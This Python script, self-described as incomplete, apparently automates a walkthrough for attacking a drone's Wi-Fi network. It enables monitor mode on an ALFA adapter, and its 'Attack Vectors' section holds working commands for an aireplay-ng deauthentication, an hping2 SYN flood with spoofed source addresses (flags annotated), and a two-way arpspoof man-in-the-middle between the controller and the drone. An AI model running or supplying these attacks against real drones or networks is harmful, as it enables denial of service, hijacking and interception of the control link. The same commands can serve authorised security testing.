#!/usr/bin/env python3
"""
NOTE - THIS IS INCOMPLETE, DO NOT ATTEMPT TO RUN THIS

This script is an attempt at automating the walkthrough Sage made.


Monitor mode (RFMON) allows a wireless interface to monitor all traffic on a given channel without needing to associate with an Access Point (AP). This is essential for capturing necessary data on the drone's network.
The ALFA AWUS036ACM wireless adapter is used here because its drivers are natively supported, avoiding complex dependency installations.
- Note: You will likely need to run these commands with sudo. Be sure to replace wlan0 with your specific adapter interface (e.g., wlan1).

"""

import subprocess
import sys
import os
import datetime
import argparse
import shutil

""" set config constants """
INTERFACE = "wlan1"
ACTUAL_USER = os.environ.get("SUDO_USER", "user") 
DESKTOP_PATH = f"/home/{ACTUAL_USER}/Desktop"
TIMESTAMP = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
CAPTURE_FILE = os.path.join(DESKTOP_PATH, f"capture_{TIMESTAMP}.pcapng")
LOG_FILE = os.path.join(DESKTOP_PATH, f"log_{TIMESTAMP}.txt")

def log_action(action):
    """Appends a timestamped action message to the log file."""
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{current_time}] {action}\n"
    with open(LOG_FILE, "a") as f:
        f.write(log_message)
    
    try:
        uid = int(subprocess.getoutput(f"id -u {ACTUAL_USER}"))
        gid = int(subprocess.getoutput(f"id -g {ACTUAL_USER}"))
        os.chown(LOG_FILE, uid, gid)
    except Exception:
        pass

def run_command(command):
    """Executes a legacy shell command silently, suppressing stdout and stderr."""
    subprocess.run(command, shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def run_monitor_command(command):
    """Run a monitor-mode command and report failures to the caller."""
    result = subprocess.run(command, text=True, capture_output=True, check=False)
    if result.returncode:
        message = result.stderr.strip() or result.stdout.strip()
        raise RuntimeError(
            f"Command failed ({result.returncode}): {' '.join(command)}"
            + (f"\n{message}" if message else "")
        )
    return result.stdout


""" ------ Monitor Mode Controls ----- """

def enable_monitor_mode(interface):
    """Enable monitor mode on the selected wireless interface."""
    if os.geteuid() != 0:
        raise RuntimeError("Monitor-mode changes require elevated privileges; run with sudo.")
    output = run_monitor_command(["airmon-ng", "start", interface])
    log_action(f"Requested monitor mode on {interface}.")
    if output.strip():
        print(output.strip())


def disable_monitor_mode(interface):
    """Stop monitor mode and restart NetworkManager if systemd is available."""
    if os.geteuid() != 0:
        raise RuntimeError("Monitor-mode changes require elevated privileges; run with sudo.")
    output = run_monitor_command(["airmon-ng", "stop", interface])
    log_action(f"Requested monitor-mode stop on {interface}.")
    if output.strip():
        print(output.strip())
    if shutil.which("systemctl"):
        run_monitor_command(["systemctl", "restart", "NetworkManager"])
        log_action("Restarted NetworkManager.")


""" ------ Attack Vectors ------ """

def de_auth():
    run_command(f"aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon")

def ddos():
    run_command(f"sudo hping2 -c 1500 -d 120 -S -w 64 -p 8866 --flood --rand-source 172.19.10.1")
    """
    -c 1500: Send 1500 packets.

    -d 120: Pad each packet to 120 bytes.

    -S: Set the SYN flag to initiate a TCP handshake.

    -w 64: Set TCP window size to 64.

    -p 8866: Target port 8866.

    --flood: Send packets as fast as possible, ignoring replies (creates the flood condition).

    --rand-source: Spoof a random source IP to hide the origin and prevent replies from returning.
    """

def mitm():
    """Enable packet forwarding"""
    run_command(f"sysctl -w net.ipv4.ip_forward=1")

    """intercept controller-to-drone traffic"""
    """note - Tells the controller (.100) that the attacker's MAC address is the drone (.1). (Replace .100 with the actual IP of the controller/phone)."""
    run_command(f"arpspoof -i wlan1 -t 172.19.10.100 172.19.10.1")

    """Intercept drone-to-controller traffic"""
    """note - In a new terminal window while the previous command is running"""
    run_command(f"arpspoof -i wlan1 -t 172.19.10.1 172.19.10.100")


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Start or stop wireless monitor mode.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument(
        "action",
        choices=("monitor-start", "monitor-stop"),
        help="The monitor-mode operation to perform.",
    )
    parser.add_argument(
        "-i", "--interface",
        default=INTERFACE,
        help="Wireless interface (use the monitor interface name for monitor-stop).",
    )
    args = parser.parse_args(argv)
    try:
        if args.action == "monitor-start":
            enable_monitor_mode(args.interface)
        else:
            disable_monitor_mode(args.interface)
    except (OSError, RuntimeError) as error:
        print(f"Error: {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())